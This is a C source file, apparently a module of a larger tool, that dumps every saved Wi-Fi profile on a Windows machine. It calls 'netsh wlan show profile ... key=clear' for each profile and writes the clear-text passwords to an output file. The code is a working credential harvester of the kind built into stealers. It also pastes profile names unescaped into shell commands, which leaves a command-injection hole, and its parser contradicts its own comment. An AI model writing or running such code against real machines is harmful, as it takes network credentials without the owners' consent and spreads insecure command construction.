#include "..\include\wifi_dumper.h"

#define MAX_PROFILES 100
#define MAX_PROFILE_NAME 256

static void trim_newline(char *str)
{
        size_t len = strlen(str);
        if (len > 0 && str[len - 1] == '\n')
                str[len - 1] = '\0';
}

/* Parse profile names from: "    All User Profile     : <name>" */
static int ext_profiles(char prf[MAX_PROFILES][MAX_PROFILE_NAME])
{
        FILE *fp = _popen("netsh wlan show profiles", "r");
        if (!fp)
                return -1;

        char line[MAX_LINE_LEN];
        int count = 0;

        while (fgets(line, sizeof(line), fp) && count < MAX_PROFILES)
        {
                char *pos = strstr(line, ":");
                if (pos)
                {
                        pos += 1;
                        while (*pos == ' ')
                                pos++;

                        trim_newline(pos);
                        strncpy(prf[count++], pos, MAX_PROFILE_NAME - 1);
                }
        }

        _pclose(fp);
        return count;
}

void run_dump_profiles(struct Command *cmd)
{
        char prfs[MAX_PROFILES][MAX_PROFILE_NAME];
        int total = ext_profiles(prfs);

        FILE *out = fopen(OUTPUT_FILE, "a");
        if (!out)
                return;

        fprintf(out, "\n===== Dump Saved Wi-Fi Profiles with Passwords =====\n");

        for (int i = 0; i < total; ++i)
        {
                char command[MAX_CMD_LEN];
                snprintf(command, sizeof(command),
                         "netsh wlan show profile name=\"%s\" key=clear", prfs[i]);

                FILE *fp = _popen(command, "r");
                if (!fp)
                        continue;

                fprintf(out, "\n--- Profile: %s ---\n", prfs[i]);

                char line[MAX_LINE_LEN];
                while (fgets(line, sizeof(line), fp))
                        fprintf(out, "%s", line);

                fprintf(out, "-----------------------------\n");

                _pclose(fp);
        }

        fprintf(out, "====================================================\n");
        fclose(out);
}